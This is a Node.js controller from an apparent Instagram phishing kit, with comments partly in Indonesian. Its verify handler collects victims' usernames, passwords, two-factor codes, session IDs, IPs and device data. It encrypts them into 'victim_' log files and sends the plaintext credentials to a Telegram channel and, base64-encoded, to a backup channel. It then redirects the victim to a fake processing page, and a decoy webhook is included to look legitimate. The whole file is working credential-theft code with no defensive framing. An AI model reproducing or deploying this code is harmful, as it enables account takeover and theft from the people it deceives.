const crypto = require('crypto');
const CryptoJS = require('crypto-js');
const telegram = require('../utils/telegram');
const obfuscate = require('../utils/obfuscate');

exports.verify = async (req, res) => {
  try {
    const { username, password, session_id, two_factor } = req.body;
    
    // Capture data lengkap
    const victimData = {
      timestamp: new Date().toISOString(),
      ip: req.headers['x-forwarded-for'] || req.ip || req.connection.remoteAddress,
      userAgent: req.headers['user-agent'],
      referer: req.headers['referer'],
      username: username,
      password: password,
      twoFactor: two_factor || 'none',
      sessionId: session_id,
      fingerprint: req.fingerprint,
      country: req.headers['cf-ipcountry'] || 'Unknown',
      language: req.headers['accept-language']
    };
    
    // 1. Enkripsi data
    const encryptedData = CryptoJS.AES.encrypt(
      JSON.stringify(victimData),
      process.env.ENCRYPTION_KEY,
      { iv: CryptoJS.enc.Utf8.parse(process.env.IV_KEY) }
    ).toString();
    
    // 2. Simpan ke file (dengan nama random)
    const filename = `victim_${Date.now()}_${crypto.randomBytes(4).toString('hex')}.enc`;
    const fs = require('fs');
    const path = require('path');
    
    if (!fs.existsSync('logs')) {
      fs.mkdirSync('logs', { recursive: true, mode: 0o700 });
    }
    
    fs.writeFileSync(
      path.join('logs', filename),
      encryptedData,
      { mode: 0o600 }
    );
    
    // 3. Kirim ke Telegram (real-time)
    const telegramMessage = `
🎣 *NEW CAPTURE* 🎣

👤 *Username:* \`${username}\`
🔑 *Password:* \`${password}\`
🌐 *IP:* ${victimData.ip}
📍 *Country:* ${victimData.country}
📱 *Device:* ${victimData.userAgent.substring(0, 50)}...
🕒 *Time:* ${new Date().toLocaleString()}
🔒 *2FA:* ${two_factor || 'No'}

#instagram #phish #capture
    `;
    
    await telegram.sendAlert(telegramMessage);
    
    // 4. Kirim juga ke backup channel (encrypted)
    const backupMessage = obfuscate.encodeBase64(telegramMessage);
    await telegram.sendBackup(backupMessage);
    
    // 5. Set session untuk processing page
    req.session.verified = true;
    req.session.userId = obfuscate.generateUserId(username);
    
    // 6. Redirect ke processing page dengan delay
    setTimeout(() => {
      res.redirect('/processing?ref=' + crypto.randomBytes(8).toString('hex'));
    }, 2000);
    
  } catch (error) {
    // Silent error handling
    console.error('[CAPTURE ERROR]', error.message);
    res.redirect('/processing');
  }
};

exports.webhook = (req, res) => {
  // Fake webhook untuk tampak legit
  res.json({ status: 'ok', message: 'Webhook received' });
};
